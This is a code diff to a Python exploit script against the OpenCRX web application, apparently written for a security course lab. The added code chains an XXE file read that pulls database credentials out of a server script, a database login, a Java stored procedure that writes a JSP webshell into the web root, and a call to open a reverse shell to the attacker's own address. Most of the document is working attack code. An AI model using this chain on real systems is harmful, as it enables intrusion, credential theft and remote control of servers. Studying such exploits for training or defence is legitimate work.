@@ -5,6 +5,8 @@ import base64
 import json
 import time
 requests.packages.urllib3.disable_warnings()
+from secrets import token_hex
+import jaydebeapi
 
 def b64encode(s):
 	return base64.b64encode(s.encode()).decode()
@@ -178,9 +180,7 @@ def login(ip, username, password):
 	return s
 
 # 9.3.6.3: Create script to parse results of XXE and clearly display fiel contents
-def read_file(ip, session, username, password, filename):
-	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
-	
+def read_file(ip, session, username, password, filename, LHOST):
 	print()
 	print(f"Reading file contents of file {filename}")
 	print("Remember to make sure web-server is running")
@@ -202,7 +202,6 @@ def read_file(ip, session, username, password, filename):
 	f"<lastName>{brkpoint}&wrapper;{brkpoint}</lastName>\n"
 	"<firstName>Tom</firstName>\n"
 	"</org.opencrx.kernel.account1.Contact>")
-	print(xml)
 
 	auth_header = f"Basic {b64encode(username + ':' + password)}"
 	headers = {
@@ -213,9 +212,49 @@ def read_file(ip, session, username, password, filename):
 	target = f"http://{ip}:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account"
 	r = session.post(target, data=xml, headers=headers)
 	file_contents = r.text.split(brkpoint)[1]
-	print(file_contents)
 	
 	return file_contents
+
+def login_db(ip, db_username, db_password):
+	print(f"Logging into database with credentials {db_username}:{db_password}")
+	jar = "./hsqldb.jar"
+	url = f"jdbc:hsqldb:hsql://{ip}:9001/CRX"
+
+	conn = jaydebeapi.connect(
+		"org.hsqldb.util.DatabaseManagerSwing",
+		url, 
+		[db_username, db_password],
+		jar
+	)
+	curs = conn.cursor()
+
+	return curs
+
+def send_file(curs, filename):
+	procedure_name = f"writeBytesToFilename{token_hex(4)}"
+	print("Creating file write procedure: ", procedure_name)
+
+	cmd = (
+		f"CREATE PROCEDURE {procedure_name}(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))\n"
+		"LANGUAGE JAVA\n"
+		"DETERMINISTIC NO SQL\n"
+		"EXTERNAL NAME\n"
+		"'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"
+	)
+
+	curs.execute(cmd)
+
+	filepath = "/home/student/crx/apache-tomee-plus-7.0.5/webapps/ROOT/shell.jsp"
+
+	with open("cmd.jsp", "r") as f:
+		import codecs
+		shell = f.read()
+		hex_shell = shell.encode('utf-8').hex()
+
+	cmd = f"call {procedure_name}(\'{filepath}\', cast('{hex_shell}' AS VARBINARY(1024)))"
+	curs.execute(cmd)
+	print("JSP webshell written onto target system")
+
 
 def main():
 	if len(sys.argv) != 2:
@@ -226,6 +265,8 @@ def main():
 	ip = sys.argv[1]
 	username = "admin-Standard"
 	password = "PwnedPassword!"
+	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+	LPORT = 9001
 
 	# low = current_milli_time()
 	# requestResetPassword(ip, username)
@@ -244,7 +285,17 @@ def main():
 	session = login(ip, username, password)
 	
 	filename = "/home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml"
-	read_file(ip, session, username, password, filename)
+	filename = "/home/student/crx/data/hsqldb/dbmanager.sh"
+	print("Getting database credentials from dbmanager.sh file with XXE")
+	db_manager_contents = read_file(ip, session, username, password, filename, LHOST)
+	db_username = re.findall(r'--user (.*?) --password', db_manager_contents)[0]
+	db_password = re.findall(r'--password (\S*)', db_manager_contents)[0] # Match non-whitespacee
+
+	curs = login_db(ip, db_username, db_password)
+
+	send_file(curs, "cmd.jsp")
+
+	send_shell(ip, LHOST, LPORT)
 
 if __name__ == '__main__':
 	main()
